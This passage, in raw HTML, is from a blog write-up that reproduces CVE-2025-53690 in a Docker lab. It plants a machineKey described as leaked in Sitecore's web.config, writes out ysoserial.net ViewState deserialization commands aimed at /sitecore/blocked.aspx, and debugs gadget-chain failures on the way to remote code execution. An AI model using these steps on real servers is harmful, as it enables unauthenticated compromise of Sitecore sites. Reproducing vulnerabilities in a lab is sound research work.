height="764"
srcset="https://demo.stack.jimmycai.com/p/cve-2025-53690/image15_hu_3b140156bf712e70.png 480w, https://demo.stack.jimmycai.com/p/cve-2025-53690/image15_hu_a1d441dba04e18a7.png 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="69"
data-flex-basis="166px"
&gt;&lt;/p&gt;
&lt;p&gt;Clone the repo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-powershell" data-lang="powershell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;git&lt;/span&gt; &lt;span class="n"&gt;clone&lt;/span&gt; &lt;span class="n"&gt;https&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="p"&gt;//&lt;/span&gt;&lt;span class="n"&gt;github&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;Sitecore&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="nb"&gt;container-deployment&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="py"&gt;git&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src="https://demo.stack.jimmycai.com/p/cve-2025-53690/image16.png"
width="1439"
height="264"
srcset="https://demo.stack.jimmycai.com/p/cve-2025-53690/image16_hu_6883254b526922ec.png 480w, https://demo.stack.jimmycai.com/p/cve-2025-53690/image16_hu_c7b304c9af5ffd21.png 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="545"
data-flex-basis="1308px"
&gt;&lt;/p&gt;
&lt;p&gt;Navigate to:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;container-deployment&lt;span class="se"&gt;\c&lt;/span&gt;ompose&lt;span class="se"&gt;\s&lt;/span&gt;xp&lt;span class="se"&gt;\1&lt;/span&gt;0.4&lt;span class="se"&gt;\l&lt;/span&gt;tsc2022&lt;span class="se"&gt;\x&lt;/span&gt;p0
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Open PowerShell as Administrator and run &lt;code&gt;compose-init.ps1&lt;/code&gt; to initialize the Sitecore environment. Provide the path to your &lt;code&gt;license.xml&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src="https://demo.stack.jimmycai.com/p/cve-2025-53690/image17.png"
width="727"
height="105"
srcset="https://demo.stack.jimmycai.com/p/cve-2025-53690/image17_hu_b3d7fbc9a491407.png 480w, https://demo.stack.jimmycai.com/p/cve-2025-53690/image17_hu_cb15fac5ab00580c.png 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="692"
data-flex-basis="1661px"
&gt;&lt;/p&gt;
&lt;p&gt;Then run:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;docker compose up -d
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;This step will take a long time to pull and build the Sitecore images â€” go grab a coffee or matcha (which i prefer) while it runs â˜•&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; To avoid port conflicts with containers, change BurpSuite&amp;rsquo;s proxy port to e.g., 8081 (not 8080). Also check whether port 443 is free. If not, stop any process occupying it (IIS (W3SVC), IIS Express, VMware/Workstation, Skype/Teams, antivirus, etc.)&lt;/p&gt;
&lt;p&gt;After the stack is ready, open &lt;code&gt;.env&lt;/code&gt; to find the Sitecore instance URL.&lt;/p&gt;
&lt;p&gt;&lt;img src="https://demo.stack.jimmycai.com/p/cve-2025-53690/image18.png"
width="862"
height="261"
srcset="https://demo.stack.jimmycai.com/p/cve-2025-53690/image18_hu_550a8fb989269a64.png 480w, https://demo.stack.jimmycai.com/p/cve-2025-53690/image18_hu_68069ecf5334f8fa.png 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="330"
data-flex-basis="792px"
&gt;&lt;/p&gt;
&lt;p&gt;Visit &lt;code&gt;https://xp0cm.localhost/&lt;/code&gt; â€” Sitecore is now deployed :D&lt;/p&gt;
&lt;p&gt;&lt;img src="https://demo.stack.jimmycai.com/p/cve-2025-53690/image19.png"
width="1651"
height="884"
srcset="https://demo.stack.jimmycai.com/p/cve-2025-53690/image19_hu_da0f909757545df1.png 480w, https://demo.stack.jimmycai.com/p/cve-2025-53690/image19_hu_8aacaf925a877c4d.png 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="186"
data-flex-basis="448px"
&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id="reproducing-the-poc"&gt;Reproducing the POC
&lt;/h2&gt;&lt;p&gt;Time to reproduce the POC :D&lt;/p&gt;
&lt;p&gt;Mandiant&amp;rsquo;s blog shows the endpoint the attacker used: &lt;strong&gt;&lt;code&gt;/sitecore/blocked.aspx&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src="https://demo.stack.jimmycai.com/p/cve-2025-53690/image20.png"
width="866"
height="364"
srcset="https://demo.stack.jimmycai.com/p/cve-2025-53690/image20_hu_1d51feb3e88455e1.png 480w, https://demo.stack.jimmycai.com/p/cve-2025-53690/image20_hu_149659607beb9afa.png 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="237"
data-flex-basis="570px"
&gt;&lt;/p&gt;
&lt;p&gt;This endpoint was chosen because it contains a hidden form VIEWSTATE and is accessible without authentication.&lt;/p&gt;
&lt;p&gt;If we request this endpoint on our instance we see an &lt;code&gt;&amp;lt;input&amp;gt;&lt;/code&gt; tag containing a VIEWSTATE field and the page doesn&amp;rsquo;t require authentication.&lt;/p&gt;
&lt;p&gt;&lt;img src="https://demo.stack.jimmycai.com/p/cve-2025-53690/image21.png"
width="1541"
height="803"
srcset="https://demo.stack.jimmycai.com/p/cve-2025-53690/image21_hu_f0a1047d9398df63.png 480w, https://demo.stack.jimmycai.com/p/cve-2025-53690/image21_hu_9ee3d96726fd4328.png 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="191"
data-flex-basis="460px"
&gt;&lt;/p&gt;
&lt;p&gt;Posting any value to &lt;code&gt;__VIEWSTATE&lt;/code&gt; at that endpoint returns a 500 error.&lt;/p&gt;
&lt;p&gt;&lt;img src="https://demo.stack.jimmycai.com/p/cve-2025-53690/image22.png"
width="1539"
height="544"
srcset="https://demo.stack.jimmycai.com/p/cve-2025-53690/image22_hu_161ec87302daa762.png 480w, https://demo.stack.jimmycai.com/p/cve-2025-53690/image22_hu_ee21755d5241a9ba.png 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="282"
data-flex-basis="678px"
&gt;&lt;/p&gt;
&lt;p&gt;To emulate the vulnerable environment used in the CVE, edit the &lt;code&gt;web.config&lt;/code&gt; inside the container &lt;code&gt;sitecore-xp0-cm-1&lt;/code&gt; and add the leaked machineKey.&lt;/p&gt;
&lt;p&gt;First run &lt;code&gt;docker ps&lt;/code&gt; to get the container id.&lt;/p&gt;
&lt;p&gt;&lt;img src="https://demo.stack.jimmycai.com/p/cve-2025-53690/image23.png"
width="832"
height="370"
srcset="https://demo.stack.jimmycai.com/p/cve-2025-53690/image23_hu_9af9918f49d7f9fd.png 480w, https://demo.stack.jimmycai.com/p/cve-2025-53690/image23_hu_63c47cf39501b2ec.png 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="224"
data-flex-basis="539px"
&gt;&lt;/p&gt;
&lt;p&gt;Copy &lt;code&gt;web.config&lt;/code&gt; out of the container:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;docker &lt;span class="nb"&gt;exec&lt;/span&gt; 0b12db41956d powershell -NoProfile -Command &lt;span class="s2"&gt;&amp;#34;Get-Content -Raw &amp;#39;C:\inetpub\wwwroot\web.config&amp;#39;&amp;#34;&lt;/span&gt; &amp;gt; web.config
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Open and add:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;span class="lnt"&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-xml" data-lang="xml"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nt"&gt;&amp;lt;system.web&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nt"&gt;&amp;lt;machineKey&lt;/span&gt; &lt;span class="na"&gt;validationKey=&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;BDDFE367CD36AAA81E195761BEFB073839549FF7B8E34E42C0DEA4600851B0065856B211719ADEFC76F3F3A556BC61A5FC8C9F28F958CB1D3BD8EF9518143DB6&amp;#34;&lt;/span&gt; &lt;span class="na"&gt;decryptionKey=&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;0DAC68D020B8193DF0FCEE1BAF7A07B4B0D40DCD3E5BA90D&amp;#34;&lt;/span&gt; &lt;span class="na"&gt;validation=&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;SHA1&amp;#34;&lt;/span&gt; &lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nt"&gt;&amp;lt;/system.web&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src="https://demo.stack.jimmycai.com/p/cve-2025-53690/image24.png"
width="1884"
height="362"
srcset="https://demo.stack.jimmycai.com/p/cve-2025-53690/image24_hu_16e2df4ba695aff1.png 480w, https://demo.stack.jimmycai.com/p/cve-2025-53690/image24_hu_80a6e9629db1f294.png 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="520"
data-flex-basis="1249px"
&gt;&lt;/p&gt;
&lt;p&gt;Write the edited &lt;code&gt;web.config&lt;/code&gt; back into the container:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nb"&gt;type&lt;/span&gt; web.config &lt;span class="p"&gt;|&lt;/span&gt; docker &lt;span class="nb"&gt;exec&lt;/span&gt; -i 0b12db41956d powershell -NoProfile -Command ^
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="nv"&gt;$in&lt;/span&gt;&lt;span class="s2"&gt;=[Console]::In.ReadToEnd(); Set-Content -Path &amp;#39;C:\inetpub\wwwroot\web.config&amp;#39; -Value &lt;/span&gt;&lt;span class="nv"&gt;$in&lt;/span&gt;&lt;span class="s2"&gt; -Encoding UTF8&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Verify it&amp;rsquo;s written successfully.&lt;/p&gt;
&lt;p&gt;&lt;img src="https://demo.stack.jimmycai.com/p/cve-2025-53690/image25.png"
width="1035"
height="55"
srcset="https://demo.stack.jimmycai.com/p/cve-2025-53690/image25_hu_a034203d23f91499.png 480w, https://demo.stack.jimmycai.com/p/cve-2025-53690/image25_hu_937b327feb1375ba.png 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="1881"
data-flex-basis="4516px"
&gt;&lt;/p&gt;
&lt;p&gt;Next, consult Soroush Dalili&amp;rsquo;s blog about exploiting ViewState deserialization:
&lt;a class="link" href="https://soroush.me/blog/exploiting-deserialisation-in-asp-net-via-viewstate" target="_blank" rel="noopener"
&gt;https://soroush.me/blog/exploiting-deserialisation-in-asp-net-via-viewstate&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;We get a sample &lt;code&gt;ysoserial.net&lt;/code&gt; command:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;.&lt;span class="se"&gt;\y&lt;/span&gt;soserial.exe -p ViewState -g TextFormattingRunProperties -c &lt;span class="s2"&gt;&amp;#34;echo 123 &amp;gt; c:\windows\temp\test.txt&amp;#34;&lt;/span&gt; --path&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;/somepath/testaspx/test.aspx&amp;#34;&lt;/span&gt; --apppath&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;/testaspx/&amp;#34;&lt;/span&gt; --decryptionalg&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;AES&amp;#34;&lt;/span&gt; --decryptionkey&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;34C69D15ADD80DA4788E6E3D02694230CF8E9ADFDA2708EF43CAEF4C5BC73887&amp;#34;&lt;/span&gt; --validationalg&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;HMACSHA256&amp;#34;&lt;/span&gt; --validationkey&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Replace &lt;code&gt;decryptionkey&lt;/code&gt;, &lt;code&gt;validationalg&lt;/code&gt;, and &lt;code&gt;validationkey&lt;/code&gt; with the leaked machineKey values and set the path to &lt;code&gt;/sitecore/blocked.aspx&lt;/code&gt;. The &lt;code&gt;apppath&lt;/code&gt; and &lt;code&gt;decryptionalg&lt;/code&gt; flags are optional, so the command becomes:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;ysoserial.exe -p ViewState -g TextFormattingRunProperties -c &lt;span class="s2"&gt;&amp;#34;echo 123 &amp;gt; c:\windows\temp\test.txt&amp;#34;&lt;/span&gt; --path&lt;span class="o"&gt;=&lt;/span&gt;/sitecore/blocked.aspx --decryptionkey&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;0DAC68D020B8193DF0FCEE1BAF7A07B4B0D40DCD3E5BA90D&amp;#34;&lt;/span&gt; --validationalg&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;SHA1&amp;#34;&lt;/span&gt; --validationkey&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;BDDFE367CD36AAA81E195761BEFB073839549FF7B8E34E42C0DEA4600851B0065856B211719ADEFC76F3F3A556BC61A5FC8C9F28F958CB1D3BD8EF9518143DB6&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Running that generates a Base64 VIEWSTATE containing our payload.&lt;/p&gt;
&lt;p&gt;&lt;img src="https://demo.stack.jimmycai.com/p/cve-2025-53690/image26.png"
width="962"
height="265"
srcset="https://demo.stack.jimmycai.com/p/cve-2025-53690/image26_hu_1755eafe5868ccc9.png 480w, https://demo.stack.jimmycai.com/p/cve-2025-53690/image26_hu_e738bcceb8429caf.png 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="363"
data-flex-basis="871px"
&gt;&lt;/p&gt;
&lt;p&gt;Send that payload in &lt;code&gt;__VIEWSTATE&lt;/code&gt; to &lt;code&gt;/sitecore/blocked.aspx&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src="https://demo.stack.jimmycai.com/p/cve-2025-53690/image27.png"
width="1541"
height="793"
srcset="https://demo.stack.jimmycai.com/p/cve-2025-53690/image27_hu_8b317e5822fc3a5b.png 480w, https://demo.stack.jimmycai.com/p/cve-2025-53690/image27_hu_422e8f89ed3d0ed3.png 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="194"
data-flex-basis="466px"
&gt;&lt;/p&gt;
&lt;p&gt;Check the temp folder to see if &lt;code&gt;test.txt&lt;/code&gt; is written:&lt;/p&gt;
&lt;p&gt;&lt;img src="https://demo.stack.jimmycai.com/p/cve-2025-53690/image28.png"
width="531"
height="445"
srcset="https://demo.stack.jimmycai.com/p/cve-2025-53690/image28_hu_da25e254adf304.png 480w, https://demo.stack.jimmycai.com/p/cve-2025-53690/image28_hu_696948d8c77108f9.png 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="119"
data-flex-basis="286px"
&gt;&lt;/p&gt;
&lt;p&gt;No test file â€” payload didn&amp;rsquo;t work :DDD&lt;/p&gt;
&lt;p&gt;To find the problem, we need to read the debug logs and stack trace. By default, Sitecore does not enable debug, so edit &lt;code&gt;web.config&lt;/code&gt; to change:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-xml" data-lang="xml"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nt"&gt;&amp;lt;customErrors&lt;/span&gt; &lt;span class="na"&gt;mode=&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;RemoteOnly&amp;#34;&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt; -&amp;gt; &lt;span class="nt"&gt;&amp;lt;customErrors&lt;/span&gt; &lt;span class="na"&gt;mode=&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;Off&amp;#34;&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;and&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;span class="lnt"&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-xml" data-lang="xml"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nt"&gt;&amp;lt;compilation&lt;/span&gt; &lt;span class="na"&gt;defaultLanguage=&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;c#&amp;#34;&lt;/span&gt; &lt;span class="na"&gt;targetFramework=&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;4.8&amp;#34;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;-&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nt"&gt;&amp;lt;compilation&lt;/span&gt; &lt;span class="na"&gt;defaultLanguage=&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;c#&amp;#34;&lt;/span&gt; &lt;span class="na"&gt;debug=&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;true&amp;#34;&lt;/span&gt; &lt;span class="na"&gt;targetFramework=&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;4.8&amp;#34;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Re-send the request and observe the stack trace:&lt;/p&gt;
&lt;p&gt;&lt;img src="https://demo.stack.jimmycai.com/p/cve-2025-53690/image29.png"
width="755"
height="715"
srcset="https://demo.stack.jimmycai.com/p/cve-2025-53690/image29_hu_aa7b843672c9bcef.png 480w, https://demo.stack.jimmycai.com/p/cve-2025-53690/image29_hu_f6f9ceab412faae0.png 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="105"
data-flex-basis="253px"
&gt;&lt;/p&gt;
&lt;p&gt;We successfully triggered deserialization â€” the stack trace reaches &lt;code&gt;System.Runtime.Serialization.Formatters.Binary.BinaryFormatter.Deserialize&lt;/code&gt; â€” but fails later at &lt;code&gt;System.Runtime.Serialization.Formatters.Binary.BinaryAssemblyInfo.GetAssembly&lt;/code&gt; with:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;[c: Unable to find assembly 'Microsoft.PowerShell.Editor, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35'.]&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;This error is because the gadget chain used the &lt;code&gt;TextFormattingRunProperties&lt;/code&gt; class from the &lt;code&gt;Microsoft.PowerShell.Editor&lt;/code&gt; assembly, which isn&amp;rsquo;t present on the web server&amp;rsquo;s &lt;code&gt;bin&lt;/code&gt; directory. So the assembly can&amp;rsquo;t be loaded.&lt;/p&gt;
&lt;p&gt;&lt;img src="https://demo.stack.jimmycai.com/p/cve-2025-53690/image30.png"
width="1036"
height="527"
srcset="https://demo.stack.jimmycai.com/p/cve-2025-53690/image30_hu_53ab0b8e46267996.png 480w, https://demo.stack.jimmycai.com/p/cve-2025-53690/image30_hu_b47622f5840f23ca.png 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="196"
data-flex-basis="471px"
&gt;&lt;/p&gt;
&lt;p&gt;Inspect the ysoserial.net generator for &lt;code&gt;TextFormattingRunProperties&lt;/code&gt;:&lt;/p&gt;
&lt;p&gt;&lt;a class="link" href="https://github.com/pwntester/ysoserial.net/blob/master/ysoserial/Generators/TextFormattingRunPropertiesGenerator.cs" target="_blank" rel="noopener"
&gt;https://github.com/pwntester/ysoserial.net/blob/master/ysoserial/Generators/TextFormattingRunPropertiesGenerator.cs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;We confirm the payload uses &lt;code&gt;TextFormattingRunProperties&lt;/code&gt; from that assembly.&lt;/p&gt;
&lt;p&gt;&lt;img src="https://demo.stack.jimmycai.com/p/cve-2025-53690/image31.png"
width="1606"
height="925"
srcset="https://demo.stack.jimmycai.com/p/cve-2025-53690/image31_hu_2ace776f734779bf.png 480w, https://demo.stack.jimmycai.com/p/cve-2025-53690/image31_hu_76a2a123a1d8511c.png 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="173"
data-flex-basis="416px"
&gt;&lt;/p&gt;
&lt;p&gt;We need a gadget chain that doesn&amp;rsquo;t depend on that assembly. After reviewing generators and related blogs, we find the &lt;code&gt;TypeConfuseDelegate&lt;/code&gt; gadget, discussed here:&lt;/p&gt;
&lt;p&gt;&lt;a class="link" href="https://testbnull.medium.com/deep-inside-typeconfusedelegate-gadgetchain-456915ed646a" target="_blank" rel="noopener"
&gt;https://testbnull.medium.com/deep-inside-typeconfusedelegate-gadgetchain-456915ed646a&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src="https://demo.stack.jimmycai.com/p/cve-2025-53690/image32.png"
width="1318"
height="494"
srcset="https://demo.stack.jimmycai.com/p/cve-2025-53690/image32_hu_fa9350ee1a2b890e.png 480w, https://demo.stack.jimmycai.com/p/cve-2025-53690/image32_hu_da49245b7e1a47bb.png 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="266"
data-flex-basis="640px"
&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;TypeConfuseDelegate&lt;/code&gt;&amp;rsquo;s call stack starts from &lt;code&gt;SortedSet&lt;/code&gt;, a core class available in &lt;code&gt;mscorlib.dll&lt;/code&gt; (the Microsoft Common Object Runtime Library), which is almost always present â€” making it portable and more likely to work on target servers. This chain should allow RCE.&lt;/p&gt;
&lt;p&gt;Generate a payload:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
